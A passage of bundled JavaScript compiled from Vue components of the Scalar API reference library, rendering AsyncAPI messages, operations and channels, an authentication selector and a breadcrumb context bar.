							"aria-label": unref(translate)("schema.examples"),
							examples: pickerExamples.value
						}, null, 8, [
							"modelValue",
							"aria-label",
							"examples"
						])) : selected.value?.example.name ? (openBlock(), createElementBlock("span", _hoisted_1$40, toDisplayString(selected.value.label), 1)) : createCommentVNode("", true), selected.value?.example.summary ? (openBlock(), createBlock(unref(ScalarMarkdown_default), {
							key: 2,
							class: "min-w-0",
							value: selected.value.example.summary
						}, null, 8, ["value"])) : createCommentVNode("", true)]),
						_: 1
					})) : createCommentVNode("", true)
				]),
				_: 1
			}, 8, ["label"])) : createCommentVNode("", true);
		};
	}
});
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/Content/AsyncApi/Message.vue.script.js
var _hoisted_1$39 = ["id"];
var _hoisted_2$24 = { class: "message-heading" };
var _hoisted_3$17 = { class: "message-layout" };
var _hoisted_4$11 = {
	key: 0,
	class: "message-details min-w-0"
};
var _hoisted_5$8 = {
	key: 1,
	class: "message-schema"
};
var _hoisted_6$7 = {
	key: 2,
	class: "message-schema"
};
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/Content/AsyncApi/Message.vue.js
var Message_default = /*#__PURE__*/ _plugin_vue_export_helper_default$1(/* @__PURE__ */ defineComponent({
	__name: "Message",
	props: {
		message: {},
		document: {},
		eventBus: {},
		options: {},
		expandedItems: { default: () => ({}) }
	},
	setup(__props) {
		const headerId = useId();
		const section = useTemplateRef("section");
		useIntersection(section, () => __props.eventBus?.emit("intersecting:nav-item", { id: __props.message.id }));
		/**
		* Resolve the message from the channel it lives on. The navigation entry only
		* carries the identifying keys, so we walk `document.channels[channelName].messages`.
		*/
		const resolvedMessage = computed(() => resolveAsyncApiMessage(__props.document, __props.message.channelName, __props.message.messageName));
		/** Heading prefers the human-friendly title, falling back to the message map key. */
		const headingText = computed(() => pickHeading(resolvedMessage.value?.title, __props.message.title, __props.message.messageName));
		const description = computed(() => resolvedMessage.value?.description || resolvedMessage.value?.summary || "");
		/**
		* Protocol keys declared directly on the message's protocol-specific `bindings`
		* (for example `ws`, `kafka`). The bindings object may be a `$ref`, so it is resolved
		* before reading the keys. Keys are lowercased to match the server protocols (which the
		* helper normalizes), so the union below de-duplicates case-insensitively.
		*/
		const messageBindingProtocols = computed(() => {
			const bindings = resolvedMessage.value?.bindings;
			if (!bindings) return [];
			const resolved = getResolvedRef(bindings);
			return Object.entries(resolved ?? {}).filter(([, value]) => value != null).map(([protocol]) => protocol.toLowerCase());
		});
		/**
		* Protocol labels for the message. A message is carried over whatever protocols its
		* channel's servers speak, so we start from the channel's server protocols and union in
		* any extra protocols the message declares its own bindings for. Without this a
		* multi-protocol message would only surface the single protocol it happens to declare a
		* binding for (or none at all).
		*/
		const protocolLabels = computed(() => {
			const channel = resolveAsyncApiChannel(__props.document, __props.message.channelName);
			const { protocols } = getChannelServerLabels(__props.document, channel);
			return [.../* @__PURE__ */ new Set([...protocols, ...messageBindingProtocols.value])];
		});
		/** Payload schema, unwrapped from `$ref`s and Multi Format Schema wrappers. */
		const payloadSchema = computed(() => resolvedMessage.value ? getAsyncApiMessagePayloadSchema(resolvedMessage.value) : void 0);
		/** Header schema, unwrapped the same way as the payload. */
		const headersSchema = computed(() => resolvedMessage.value ? getAsyncApiMessageHeadersSchema(resolvedMessage.value) : void 0);
		/** Fill in defaults so the shared Schema renderer always receives a complete options object. */
		const schemaOptions = computed(() => ({
			hideReadOnly: false,
			...resolveSchemaRenderOptions(__props.options)
		}));
		/**
		* Accordion open state. Kept locally so clicking the header always toggles
		* immediately, and seeded/synced from the shared sidebar expansion map so
		* expanding the message in the sidebar (or deep-linking to it) opens it here too.
		*/
		const isExpanded = ref(__props.expandedItems[__props.message.id] ?? false);
		watch(() => __props.expandedItems[__props.message.id], (value) => {
			if (value !== void 0) isExpanded.value = value;
		});
		/** Toggling the accordion updates local state and keeps the sidebar in sync. */
		const onToggle = (open) => {
			isExpanded.value = open;
			__props.eventBus?.emit("toggle:nav-item", {
				id: __props.message.id,
				open
			});
		};
		const generatedPayload = computed(() => resolvedMessage.value ? getGeneratedPayloadExample(resolvedMessage.value) : void 0);
		const { level: headingLevel } = useDocumentOutline("message");
		return (_ctx, _cache) => {
			return openBlock(), createElementBlock("div", {
				id: __props.message.id,
				ref_key: "section",
				ref: section,
				class: "message"
			}, [createVNode(unref(SectionAccordion_default), {
				class: "message-accordion",
				modelValue: isExpanded.value,
				"onUpdate:modelValue": onToggle
			}, {
				title: withCtx(() => [createVNode(unref(Anchor_default), { onCopyAnchorUrl: _cache[0] || (_cache[0] = () => __props.eventBus?.emit("copy-url:nav-item", { id: __props.message.id })) }, {
					default: withCtx(() => [createBaseVNode("span", _hoisted_2$24, [createVNode(unref(SectionHeaderTag_default), {
						id: unref(headerId),
						class: "message-title",
						level: unref(headingLevel)
					}, {
						default: withCtx(() => [createTextVNode(toDisplayString(headingText.value), 1)]),
						_: 1
					}, 8, ["id", "level"]), createVNode(AsyncApiLabels_default, { protocols: protocolLabels.value }, null, 8, ["protocols"])])]),
					_: 1
				})]),
				default: withCtx(() => [createBaseVNode("div", _hoisted_3$17, [description.value || headersSchema.value || payloadSchema.value ? (openBlock(), createElementBlock("div", _hoisted_4$11, [
					description.value ? (openBlock(), createBlock(unref(ScalarMarkdown_default), {
						key: 0,
						class: "message-description",
						value: description.value,
						withImages: ""
					}, null, 8, ["value"])) : createCommentVNode("", true),
					headersSchema.value ? (openBlock(), createElementBlock("div", _hoisted_5$8, [_cache[1] || (_cache[1] = createBaseVNode("div", { class: "message-schema-title" }, "Headers", -1)), createVNode(unref(Schema_default), {
						breadcrumb: [__props.message.id, "headers"],
						compact: "",
						eventBus: __props.eventBus,
						name: "Headers",
						noncollapsible: "",
						options: schemaOptions.value,
						schema: headersSchema.value
					}, null, 8, [
						"breadcrumb",
						"eventBus",
						"options",
						"schema"
					])])) : createCommentVNode("", true),
					payloadSchema.value ? (openBlock(), createElementBlock("div", _hoisted_6$7, [_cache[2] || (_cache[2] = createBaseVNode("div", { class: "message-schema-title" }, "Payload", -1)), createVNode(unref(Schema_default), {
						breadcrumb: [__props.message.id, "payload"],
						compact: "",
						eventBus: __props.eventBus,
						name: "Payload",
						noncollapsible: "",
						options: schemaOptions.value,
						schema: payloadSchema.value
					}, null, 8, [
						"breadcrumb",
						"eventBus",
						"options",
						"schema"
					])])) : createCommentVNode("", true)
				])) : createCommentVNode("", true), createVNode(MessageExamples_default, {
					class: "message-examples",
					examples: resolvedMessage.value?.examples,
					generatedPayload: isExpanded.value ? generatedPayload.value : void 0
				}, null, 8, ["examples", "generatedPayload"])])]),
				_: 1
			}, 8, ["modelValue"])], 8, _hoisted_1$39);
		};
	}
}), [["__scopeId", "data-v-e4e494f4"]]);
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/Content/AsyncApi/Operation.vue.script.js
var _hoisted_1$38 = ["id"];
var _hoisted_2$23 = { class: "operation-header" };
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/Content/AsyncApi/Operation.vue.js
var Operation_default$1 = /*#__PURE__*/ _plugin_vue_export_helper_default$1(/* @__PURE__ */ defineComponent({
	__name: "Operation",
	props: {
		operation: {},
		document: {},
		eventBus: {},
		options: {},
		expandedItems: { default: () => ({}) }
	},
	setup(__props) {
		const headerId = useId();
		const section = useTemplateRef("section");
		useIntersection(section, () => __props.eventBus?.emit("intersecting:nav-item", { id: __props.operation.id }));
		/**
		* Resolve the operation from the document so we can read its summary/description.
		* Operation traits are merged in (matching the channel connection UI) so trait-only
		* fields render as part of the operation.
		*/
		const resolvedOperation = computed(() => resolveAsyncApiOperation(__props.document, __props.operation.operationName));
		/** Heading prefers title, then summary, then the operation map key. */
		const headingText = computed(() => pickHeading(resolvedOperation.value?.title, __props.operation.title, __props.operation.operationName));
		const description = computed(() => resolvedOperation.value?.description || resolvedOperation.value?.summary || "");
		/** Only the message children of this operation. */
		const messages = computed(() => filterChildrenByType(__props.operation.children, "asyncapi-message"));
		/** OAuth scopes required by this operation, rendered below the description. */
		const requiredSecurity = computed(() => getAsyncApiRequiredSecurity(__props.document, resolvedOperation.value));
		const { level: headingLevel } = useDocumentOutline("operation");
		return (_ctx, _cache) => {
			return openBlock(), createElementBlock("div", {
				id: __props.operation.id,
				ref_key: "section",
				ref: section,
				class: normalizeClass(["operation", `operation--${__props.operation.action}`])
			}, [
				createBaseVNode("div", _hoisted_2$23, [createBaseVNode("span", { class: normalizeClass(["operation-action", `operation-action--${__props.operation.action}`]) }, toDisplayString(__props.operation.action), 3), createVNode(unref(Anchor_default), { onCopyAnchorUrl: _cache[0] || (_cache[0] = () => __props.eventBus?.emit("copy-url:nav-item", { id: __props.operation.id })) }, {
					default: withCtx(() => [createVNode(unref(SectionHeaderTag_default), {
						id: unref(headerId),
						class: "operation-title",
						level: unref(headingLevel)
					}, {
						default: withCtx(() => [createTextVNode(toDisplayString(headingText.value), 1)]),
						_: 1
					}, 8, ["id", "level"])]),
					_: 1
				})]),
				description.value ? (openBlock(), createBlock(unref(ScalarMarkdown_default), {
					key: 0,
					class: "operation-description",
					value: description.value,
					withImages: ""
				}, null, 8, ["value"])) : createCommentVNode("", true),
				createVNode(OperationScopes_default, { requiredSecurity: requiredSecurity.value }, null, 8, ["requiredSecurity"]),
				(openBlock(true), createElementBlock(Fragment, null, renderList(messages.value, (message) => {
					return openBlock(), createBlock(Message_default, {
						key: message.id,
						document: __props.document,
						eventBus: __props.eventBus,
						expandedItems: __props.expandedItems,
						message,
						options: __props.options
					}, null, 8, [
						"document",
						"eventBus",
						"expandedItems",
						"message",
						"options"
					]);
				}), 128))
			], 10, _hoisted_1$38);
		};
	}
}), [["__scopeId", "data-v-a929e624"]]);
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/Content/AsyncApi/Channel.vue.js
var Channel_default = /*#__PURE__*/ _plugin_vue_export_helper_default$1(/* @__PURE__ */ defineComponent({
	__name: "Channel",
	props: {
		channel: {},
		document: {},
		layout: {},
		isCollapsed: { type: Boolean },
		eventBus: {},
		options: {},
		expandedItems: { default: () => ({}) },
		level: { default: 0 }
	},
	setup(__props) {
		const headerId = useId();
		/**
		* Resolve the channel from the document so we can read its description.
		* The navigation entry only carries the address and identifying keys.
		*/
		const resolvedChannel = computed(() => resolveAsyncApiChannel(__props.document, __props.channel.channelName));
		const description = computed(() => resolvedChannel.value?.description ?? "");
		/**
		* Heading shown above each channel section.
		*
		* Prefers the human-friendly `channel.title` when it is set, then falls back
		* to `channel.address`. `channel.channelAddress` already encodes the
		* address-or-key fallback during navigation traversal, so we only need to
		* overlay `title` on top of it.
		*/
		const headingText = computed(() => pickHeading(resolvedChannel.value?.title, __props.channel.channelAddress));
		/**
		* Channel address parameters mapped into the OpenAPI parameter shape so we can reuse the shared
		* `ParameterList` component instead of building a dedicated AsyncAPI renderer.
		*/
		const parameters = computed(() => adaptAsyncApiParameters(resolvedChannel.value?.parameters));
		/** Fill in defaults so the shared renderer always receives a complete options object. */
		const parameterListOptions = computed(() => ({
			hideModels: __props.options?.hideModels ?? false,
			...resolveSchemaRenderOptions(__props.options)
		}));
		/**
		* Server-name and protocol labels for the channel, resolved from `document.servers`
		* (restricted to `channel.servers` when declared) and rendered as pills in the header.
		*/
		const labels = computed(() => getChannelServerLabels(__props.document, resolvedChannel.value));
		/** Operations that target this channel, rendered nested beneath the channel content. */
		const operations = computed(() => filterChildrenByType(__props.channel.children, "asyncapi-operation"));
		const { level: headingLevel } = useDocumentOutline("channel");
		return (_ctx, _cache) => {
			return __props.layout === "classic" ? (openBlock(), createBlock(unref(SectionContainerAccordion_default), {
				key: 0,
				"aria-label": headingText.value,
				class: "channel-section",
				modelValue: !__props.isCollapsed,
				"onUpdate:modelValue": _cache[1] || (_cache[1] = (value) => __props.eventBus?.emit("toggle:nav-item", {
					id: __props.channel.id,
					open: value
				}))
			}, {
				title: withCtx(() => [
					createVNode(unref(SectionHeader_default), { class: "channel-name" }, {
						default: withCtx(() => [createVNode(unref(Anchor_default), { onCopyAnchorUrl: _cache[0] || (_cache[0] = () => __props.eventBus?.emit("copy-url:nav-item", { id: __props.channel.id })) }, {
							default: withCtx(() => [createVNode(unref(SectionHeaderTag_default), { level: unref(headingLevel) }, {
								default: withCtx(() => [createTextVNode(toDisplayString(headingText.value), 1)]),
								_: 1
							}, 8, ["level"])]),
							_: 1
						})]),
						_: 1
					}),
					createVNode(AsyncApiLabels_default, {
						class: "channel-labels",
						protocols: labels.value.protocols,
						servers: labels.value.servers
					}, null, 8, ["protocols", "servers"]),
					createVNode(unref(ScalarMarkdown_default), {
						class: "channel-description",
						value: description.value,
						withImages: ""
					}, null, 8, ["value"])
				]),
				default: withCtx(() => [parameters.value.length ? (openBlock(), createBlock(ParameterList_default, {
					key: 0,
					eventBus: __props.eventBus,
					options: parameterListOptions.value,
					parameters: parameters.value
				}, {
					title: withCtx(() => [..._cache[4] || (_cache[4] = [createTextVNode("Parameters", -1)])]),
					_: 1
				}, 8, [
					"eventBus",
					"options",
					"parameters"
				])) : createCommentVNode("", true), (openBlock(true), createElementBlock(Fragment, null, renderList(operations.value, (operation) => {
					return openBlock(), createBlock(Operation_default$1, {
						key: operation.id,
						document: __props.document,
						eventBus: __props.eventBus,
						expandedItems: __props.expandedItems,
						operation,
						options: __props.options
					}, null, 8, [
						"document",
						"eventBus",
						"expandedItems",
						"operation",
						"options"
					]);
				}), 128))]),
				_: 1
			}, 8, ["aria-label", "modelValue"])) : (openBlock(), createBlock(unref(SectionContainer_default), {
				key: 1,
				"aria-labelledby": unref(headerId),
				omit: __props.level !== 0,
				role: "region"
			}, {
				default: withCtx(() => [createVNode(unref(Section_default), {
					id: __props.channel.id,
					role: "none",
					onIntersecting: _cache[3] || (_cache[3] = () => __props.eventBus?.emit("intersecting:nav-item", { id: __props.channel.id }))
				}, {
					default: withCtx(() => [createVNode(unref(SectionHeader_default), null, {
						default: withCtx(() => [createVNode(unref(Anchor_default), { onCopyAnchorUrl: _cache[2] || (_cache[2] = () => __props.eventBus?.emit("copy-url:nav-item", { id: __props.channel.id })) }, {
							default: withCtx(() => [createVNode(unref(SectionHeaderTag_default), {
								id: unref(headerId),
								level: unref(headingLevel)
							}, {
								default: withCtx(() => [createTextVNode(toDisplayString(headingText.value), 1)]),
								_: 1
							}, 8, ["id", "level"])]),
							_: 1
						})]),
						_: 1
					}), createVNode(unref(SectionContent_default), null, {
						default: withCtx(() => [
							createVNode(AsyncApiLabels_default, {
								class: "channel-labels",
								protocols: labels.value.protocols,
								servers: labels.value.servers
							}, null, 8, ["protocols", "servers"]),
							createVNode(unref(ScalarMarkdown_default), {
								value: description.value,
								withImages: ""
							}, null, 8, ["value"]),
							parameters.value.length ? (openBlock(), createBlock(ParameterList_default, {
								key: 0,
								eventBus: __props.eventBus,
								options: parameterListOptions.value,
								parameters: parameters.value
							}, {
								title: withCtx(() => [..._cache[5] || (_cache[5] = [createTextVNode("Parameters", -1)])]),
								_: 1
							}, 8, [
								"eventBus",
								"options",
								"parameters"
							])) : createCommentVNode("", true),
							(openBlock(true), createElementBlock(Fragment, null, renderList(operations.value, (operation) => {
								return openBlock(), createBlock(Operation_default$1, {
									key: operation.id,
									document: __props.document,
									eventBus: __props.eventBus,
									expandedItems: __props.expandedItems,
									operation,
									options: __props.options
								}, null, 8, [
									"document",
									"eventBus",
									"expandedItems",
									"operation",
									"options"
								]);
							}), 128))
						]),
						_: 1
					})]),
					_: 1
				}, 8, ["id"])]),
				_: 1
			}, 8, ["aria-labelledby", "omit"]));
		};
	}
}), [["__scopeId", "data-v-c60febe5"]]);
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/Content/AsyncApi/AsyncApiTraversedEntry.vue.js
var AsyncApiTraversedEntry_default = /* @__PURE__ */ defineComponent({
	__name: "AsyncApiTraversedEntry",
	props: {
		entries: {},
		document: {},
		expandedItems: {},
		options: {},
		eventBus: {},
		level: { default: 0 }
	},
	setup(__props) {
		const isTagGroup = (entry) => entry.type === "tag" && entry.isGroup === true;
		/**
		* Narrow to a regular (non-group) tag. Tag groups go through a separate branch
		* and must not inflate the sibling-tag count used for `moreThanOneTag`,
		* otherwise `ModernLayout` shows a "Show more" button for a lone tag whenever
		* it sits next to a tag group.
		*/
		const isTag = (entry) => entry.type === "tag" && !isTagGroup(entry);
		const isChannel = (entry) => entry.type === "asyncapi-channel";
		/** The top-level "Models" container that wraps individual schema entries. */
		const isModelsTag = (entry) => entry.type === "models";
		/** A single schema rendered as a model. */
		const isModel = (entry) => entry.type === "model";
		/**
		* Reusable schemas live under `components.schemas`, the same place OpenAPI keeps them.
		* Resolve the wrapper once (merging `$ref` siblings) so the template can gate the Models section.
		*/
		const componentSchemas = computed(() => __props.document.components ? getResolvedRef(__props.document.components, mergeSiblingReferences).schemas : void 0);
		/** Resolve a schema by name into the shape the shared Model component expects. */
		const getModelSchema = (name) => getAsyncApiModelSchema(__props.document, name);
		return (_ctx, _cache) => {
			const _component_AsyncApiTraversedEntry = resolveComponent("AsyncApiTraversedEntry", true);
			return openBlock(true), createElementBlock(Fragment, null, renderList(__props.entries, (entry) => {
				return openBlock(), createBlock(Lazy_default, {
					id: entry.id,
					key: `${entry.id}-${__props.options.layout}`,
					expanded: !!__props.expandedItems[entry.id]
				}, {
					default: withCtx(() => [isChannel(entry) ? (openBlock(), createBlock(Channel_default, {
						key: 0,
						channel: entry,
						document: __props.document,
						eventBus: __props.eventBus,
						expandedItems: __props.expandedItems,
						isCollapsed: !__props.expandedItems[entry.id],
						layout: __props.options.layout,
						level: __props.level,
						options: __props.options
					}, null, 8, [
						"channel",
						"document",
						"eventBus",
						"expandedItems",
						"isCollapsed",
						"layout",
						"level",
						"options"
					])) : isTag(entry) || isTagGroup(entry) && __props.options.layout === "classic" ? (openBlock(), createBlock(unref(Tag_default), {
						key: 1,
						eventBus: __props.eventBus,
						isCollapsed: !__props.expandedItems[entry.id],
						layout: __props.options.layout,
						moreThanOneTag: __props.entries.filter(isTag).length > 1,
						tag: entry
					}, {
						default: withCtx(() => [entry.children?.length ? (openBlock(), createBlock(_component_AsyncApiTraversedEntry, {
							key: 0,
							document: __props.document,
							entries: entry.children,
							eventBus: __props.eventBus,
							expandedItems: __props.expandedItems,
							level: __props.level + 1,
							options: __props.options
						}, null, 8, [
							"document",
							"entries",
							"eventBus",
							"expandedItems",
							"level",
							"options"
						])) : createCommentVNode("", true)]),
						_: 2
					}, 1032, [
						"eventBus",
						"isCollapsed",
						"layout",
						"moreThanOneTag",
						"tag"
					])) : isTagGroup(entry) ? (openBlock(), createBlock(_component_AsyncApiTraversedEntry, {
						key: 2,
						document: __props.document,
						entries: entry.children ?? [],
						eventBus: __props.eventBus,
						expandedItems: __props.expandedItems,
						level: __props.level + 1,
						options: __props.options
					}, null, 8, [
						"document",
						"entries",
						"eventBus",
						"expandedItems",
						"level",
						"options"
					])) : isModelsTag(entry) && componentSchemas.value ? (openBlock(), createBlock(ModelTag_default, {
						key: 3,
						id: entry.id,
						eventBus: __props.eventBus,
						isCollapsed: !__props.expandedItems[entry.id],
						layout: __props.options.layout,
						modelsSectionLabel: __props.options.modelsSectionLabel
					}, {
						default: withCtx(() => [createVNode(_component_AsyncApiTraversedEntry, {
							document: __props.document,
							entries: entry.children ?? [],
							eventBus: __props.eventBus,
							expandedItems: __props.expandedItems,
							level: __props.level + 1,
							options: __props.options
						}, null, 8, [
							"document",
							"entries",
							"eventBus",
							"expandedItems",
							"level",
							"options"
						])]),
						_: 2
					}, 1032, [
						"id",
						"eventBus",
						"isCollapsed",
						"layout",
						"modelsSectionLabel"
					])) : isModel(entry) && getModelSchema(entry.name) ? (openBlock(), createBlock(Model_default, {
						key: 4,
						id: entry.id,
						eventBus: __props.eventBus,
						isCollapsed: !__props.expandedItems[entry.id],
						name: entry.name,
						options: __props.options,
						schema: getModelSchema(entry.name)
					}, null, 8, [
						"id",
						"eventBus",
						"isCollapsed",
						"name",
						"options",
						"schema"
					])) : createCommentVNode("", true)]),
					_: 2
				}, 1032, ["id", "expanded"]);
			}), 128);
		};
	}
});
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/Content/Auth/Auth.vue.js
var Auth_default = /* @__PURE__ */ defineComponent({
	__name: "Auth",
	props: {
		options: {},
		authStore: {},
		document: {},
		eventBus: {},
		securitySchemes: {},
		selectedServer: {},
		environment: {}
	},
	setup(__props) {
		const { translate } = useLocalization();
		/**
		* Document name used to scope auth selections in the store. Both OpenAPI and AsyncAPI
		* documents persist it on `x-scalar-navigation.name`.
		*/
		const documentName = computed(() => {
			if (isOpenApiDocument(__props.document) || isAsyncApiDocument(__props.document)) return __props.document["x-scalar-navigation"]?.name ?? "";
			return "";
		});
		/** Document type used to label the missing-type warning (OpenAPI vs AsyncAPI). */
		const documentType = computed(() => getDocumentType(__props.document));
		/**
		* Compute what the security requirements should be for the document.
		*
		* AsyncAPI has no root-level `security`, so document-wide auth is derived from the union of
		* every server's security requirements.
		*/
		const securityRequirements = computed(() => {
			if (isAsyncApiDocument(__props.document)) return getAsyncApiDocumentSecurityRequirements(__props.document);
			return getSecurityRequirements(isOpenApiDocument(__props.document) ? __props.document.security : void 0);
		});
		/** Grab the selected security for the document from the auth store */
		const documentSelectedSecurity = computed(() => __props.authStore.getAuthSelectedSchemas({
			type: "document",
			documentName: documentName.value
		}));
		/** The selected security keys for the document */
		const selectedSecurity = computed(() => getSelectedSecurity(documentSelectedSecurity.value, void 0, securityRequirements.value, __props.securitySchemes, __props.options.authentication?.preferredSecurityScheme));
		return (_ctx, _cache) => {
			return Object.keys(__props.securitySchemes).length ? (openBlock(), createBlock(unref(AuthSelector_default), {
				key: 0,
				canDeleteSchemes: false,
				createAnySecurityScheme: __props.options.authentication?.createAnySecurityScheme ?? false,
				documentType: documentType.value,
				environment: __props.environment,
				eventBus: __props.eventBus,
				isStatic: "",
				layout: "reference",
				meta: { type: "document" },
				options: {
					oauth2RedirectUri: __props.options.oauth2RedirectUri,
					customFetch: __props.options.customFetch
				},
				persistAuth: __props.options.persistAuth,
				proxyUrl: __props.options.proxyUrl ?? "",
				securityRequirements: securityRequirements.value,
				securitySchemes: __props.securitySchemes,
				selectedSecurity: selectedSecurity.value,
				server: __props.selectedServer,
				title: unref(translate)("authentication.title")
			}, null, 8, [
				"createAnySecurityScheme",
				"documentType",
				"environment",
				"eventBus",
				"options",
				"persistAuth",
				"proxyUrl",
				"securityRequirements",
				"securitySchemes",
				"selectedSecurity",
				"server",
				"title"
			])) : createCommentVNode("", true);
		};
	}
});
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/Content/ContextBar/helpers.js
/** Narrow a rendered crumb to the collapsed-middle placeholder. */
var isEllipsis = (crumb) => "ellipsis" in crumb;
/**
* Collapse the middle of a trail to `first … secondLast last`.
*
* Only the middle is folded away: the root gives the top-level context and the
* last two keep the immediate parent and current section visible. Trails with no
* real middle to hide (fewer than four crumbs) are returned untouched.
*/
var collapseTrail = (chain) => {
	if (chain.length < 4) return chain;
	const [head] = chain;
	const tail = chain.slice(-2);
	const hidden = chain.slice(1, -2);
	return [
		...head ? [head] : [],
		{
			ellipsis: true,
			hiddenTitles: hidden.map((crumb) => crumb.title)
		},
		...tail
	];
};
/**
* Whether the navigation contains nested tags that render their own headings.
* Legacy tag-group wrappers only render headings in the classic layout, so they
* do not reserve an empty context bar in the modern layout.
*/
var hasRenderableTagHierarchy = (entries, layout) => {
	return getInitialContextChain(entries, layout).length >= 2;
};
/**
* Find the first nested tag trail to show before scrolling selects a section.
* This keeps the context bar useful during the Introduction instead of leaving
* its reserved space empty.
*/
var getInitialContextChain = (entries, layout) => {
	const visit = (items, ancestors) => {
		for (const entry of items) {
			const chain = entry.type === "tag" && (entry.isTagGroup !== true || layout === "classic") ? [...ancestors, {
				id: entry.id,
				title: entry.title
			}] : ancestors;
			if (chain.length >= 2) return chain;
			if ("children" in entry && entry.children !== void 0) {
				const nestedChain = visit(entry.children, chain);
				if (nestedChain.length >= 2) return nestedChain;
			}
		}
		return [];
	};
	return visit(entries, []);
};
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/Content/ContextBar/ContextBar.vue.script.js
var _hoisted_1$37 = [
	"aria-hidden",
	"aria-label",
	"data-stuck"
];
var _hoisted_2$22 = ["title"];
var _hoisted_3$16 = {
	key: 2,
	"aria-current": "page",
	class: "text-c-1 shrink-0 font-medium whitespace-nowrap"
};
var _hoisted_4$10 = ["onClick"];
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/Content/ContextBar/ContextBar.vue.js
var ContextBar_default = /*#__PURE__*/ _plugin_vue_export_helper_default$1(/* @__PURE__ */ defineComponent({
	__name: "ContextBar",
	props: { chain: {} },
	emits: ["navigate"],
	setup(__props, { emit: __emit }) {
		const emit = __emit;
		const navRef = ref(null);
		/**
		* Whether the full trail is wider than the bar and needs its middle collapsed.
		* Measured from the DOM so we only truncate when there genuinely is not enough
		* room — a wide bar shows the whole hierarchy.
		*/
		const overflowing = ref(false);
		/** Whether the bar has reached its sticky offset. */
		const isStuck = ref(false);
		/** The reserved bar only becomes an accessible landmark once it has context to show. */
		const hasBreadcrumb = computed(() => __props.chain.length >= 2);
		/** The crumbs actually rendered: the full trail while it fits, collapsed once it does not. */
		const displayCrumbs = computed(() => {
			if (!hasBreadcrumb.value) return [];
			return overflowing.value ? collapseTrail(__props.chain) : __props.chain;
		});
		/** The last crumb is the section in view, so it is shown as plain text. */
		const isCurrent = (index) => index === displayCrumbs.value.length - 1;
		/** Jump to an ancestor section when its crumb is clicked. */
		const onCrumbClick = (id) => emit("navigate", id);
		/**
		* Measure the crumbs directly and flag overflow. A `flex`/`overflow: visible` row
		* does not report overflow via `scrollWidth`, so we sum the natural crumb widths
		* (`getBoundingClientRect`, so the SVG separators count too) plus the gaps between them.
		*/
		const measureOverflow = () => {
			const nav = navRef.value;
			if (!nav) return;
			const style = getComputedStyle(nav);
			const gap = Number.parseFloat(style.columnGap) || 0;
			const available = nav.clientWidth - Number.parseFloat(style.paddingLeft) - Number.parseFloat(style.paddingRight);
			const children = Array.from(nav.children);
			const needed = children.reduce((total, child) => total + child.getBoundingClientRect().width, 0) + gap * Math.max(0, children.length - 1);
			overflowing.value = needed > available + 1;
		};
		let resizeObserver = null;
		let frame = null;
		let stickyFrame = null;
		/**
		* Re-decide whether the trail fits, coalescing resize bursts and chain changes into a
		* single measurement per frame so we do not thrash layout while the viewport is dragged.
		* We optimistically reset to the full trail, wait for that render, then measure — which
		* lets a widening bar re-expand a trail that was previously collapsed.
		*/
		const scheduleOverflowCheck = () => {
			overflowing.value = false;
			if (frame !== null) return;
			if (typeof requestAnimationFrame === "undefined") {
				nextTick(measureOverflow);
				return;
			}
			frame = requestAnimationFrame(() => {
				frame = null;
				nextTick(measureOverflow);
			});
		};
		/** Swap the separator edge when the bar pins to its sticky offset. */
		const updateStickyState = () => {
			const nav = navRef.value;
			if (!nav) return;
			const stickyTop = Number.parseFloat(getComputedStyle(nav).top) || 0;
			isStuck.value = nav.getBoundingClientRect().top <= stickyTop;
		};
		const scheduleStickyCheck = () => {
			if (stickyFrame !== null) return;
			if (typeof requestAnimationFrame === "undefined") {
				updateStickyState();
				return;
			}
			stickyFrame = requestAnimationFrame(() => {
				stickyFrame = null;
				updateStickyState();
			});
		};
		watch(navRef, (nav) => {
			resizeObserver?.disconnect();
			if (nav && typeof ResizeObserver !== "undefined") {
				resizeObserver = new ResizeObserver(() => {
					scheduleOverflowCheck();
					scheduleStickyCheck();
				});
				resizeObserver.observe(nav);
				scheduleOverflowCheck();
				scheduleStickyCheck();
			}
		}, { immediate: true });
		watch(() => __props.chain, scheduleOverflowCheck, { flush: "post" });
		onMounted(() => {
			window.addEventListener("scroll", scheduleStickyCheck, {
				capture: true,
				passive: true
			});
			window.addEventListener("resize", scheduleStickyCheck, { passive: true });
			scheduleStickyCheck();
		});
		onBeforeUnmount(() => {
			resizeObserver?.disconnect();
			window.removeEventListener("scroll", scheduleStickyCheck, true);
			window.removeEventListener("resize", scheduleStickyCheck);
			if (frame !== null && typeof cancelAnimationFrame !== "undefined") cancelAnimationFrame(frame);
			if (stickyFrame !== null && typeof cancelAnimationFrame !== "undefined") cancelAnimationFrame(stickyFrame);
		});
		return (_ctx, _cache) => {
			return openBlock(), createElementBlock("nav", {
				ref_key: "navRef",
				ref: navRef,
				"aria-hidden": !hasBreadcrumb.value,
				"aria-label": hasBreadcrumb.value ? "Breadcrumb" : void 0,
				class: "context-bar bg-b-1.5 text-c-2 sticky top-(--refs-header-height) z-10 flex items-center gap-1.5 text-sm",
				"data-scalar-scroll-header": "",
				"data-stuck": isStuck.value || void 0
			}, [(openBlock(true), createElementBlock(Fragment, null, renderList(displayCrumbs.value, (crumb, index) => {
				return openBlock(), createElementBlock(Fragment, { key: unref(isEllipsis)(crumb) ? `ellipsis-${index}` : crumb.id }, [index > 0 ? (openBlock(), createBlock(unref(ScalarIconCaretRight_default), {
					key: 0,
					class: "text-c-3 size-2.5 shrink-0",
					weight: "bold"
				})) : createCommentVNode("", true), unref(isEllipsis)(crumb) ? (openBlock(), createElementBlock("span", {
					key: 1,
					class: "text-c-3 shrink-0",
					title: crumb.hiddenTitles.join(" › ")
				}, " … ", 8, _hoisted_2$22)) : isCurrent(index) ? (openBlock(), createElementBlock("span", _hoisted_3$16, toDisplayString(crumb.title), 1)) : (openBlock(), createElementBlock("button", {
					key: 3,
					class: "hover:text-c-1 shrink-0 cursor-pointer whitespace-nowrap transition-colors",
					type: "button",
					onClick: ($event) => onCrumbClick(crumb.id)
				}, toDisplayString(crumb.title), 9, _hoisted_4$10))], 64);
			}), 128))], 8, _hoisted_1$37);
		};
	}
}), [["__scopeId", "data-v-ee0ad679"]]);
//#endregion
